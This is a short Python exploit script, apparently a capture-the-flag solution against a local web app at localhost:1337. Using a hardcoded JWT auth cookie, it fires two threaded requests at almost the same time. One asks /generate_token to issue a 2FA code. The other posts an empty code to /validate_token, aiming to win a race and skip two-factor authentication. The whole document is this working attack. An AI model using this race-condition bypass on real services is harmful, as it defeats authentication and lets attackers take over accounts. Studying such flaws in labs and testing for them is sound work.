import requests
import threading
import time

class EXPLOIT:

    __URL = "http://localhost:1337"
    __token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJhMDRhYzg2ZDcxZTg0ODc0ODIwYmQzNmM1ODIzMzY0YyIsImlhdCI6MTcyOTE4NjcxNywiZXhwIjoxNzI5MTkwMzE3fQ.pQpWefG9gAK0lah_LNZPqnQ7ENtuJcRxAcY97CKhpL8"
    session = requests.Session()

    def fa2(self):
        response = self.session.post(f"{self.__URL}/generate_token", cookies={
            "auth": self.__token
        })
        if response.status_code == 200:
            print(f"2FA code generated successfully")
            return

    def validate(self):
        response = self.session.post(f"{self.__URL}/validate_token", json={
            "data": ""
        }, cookies={
            "auth": self.__token
        })
        if response.status_code == 200:
            print(response.text)
            return

if __name__ == "__main__":
    exploit = EXPLOIT()
    t1 = threading.Thread(target=exploit.fa2)
    t1.daemon = True
    t1.start()

    # time.sleep(0.0009)

    t2 = threading.Thread(target=exploit.validate)
    t2.daemon = True
    t2.start()

    time.sleep(3)